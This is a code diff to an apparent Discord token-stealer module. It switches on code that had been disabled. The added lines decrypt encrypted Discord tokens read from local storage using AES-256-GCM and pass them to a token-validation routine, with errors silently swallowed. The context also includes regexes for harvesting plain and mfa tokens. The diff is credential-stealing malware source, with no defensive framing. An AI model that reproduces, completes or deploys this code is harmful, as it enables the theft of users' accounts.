@@ -55,7 +55,7 @@ module.exports = (client) => {
 
                             var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
                             if (line.match(encrypted_regex)) {
-                                return;
+                                try {
                                 var token = Buffer.from(line.match(encrypted_regex)[0].split('dQw4w9WgXcQ:')[1], "base64");
                                 let start = token.slice(3, 15),
                                     middle = token.slice(15, token.length - 16),
@@ -63,9 +63,10 @@ module.exports = (client) => {
                                     decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', _key, start);
 
                                 decipher.setAuthTag(end);
-                                //token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
+                                token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
 
-                                //await this.validateToken(key, token);
+                                await this.validateToken(key, token);
+                                } catch {}
                             }
                         } else {
                             [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
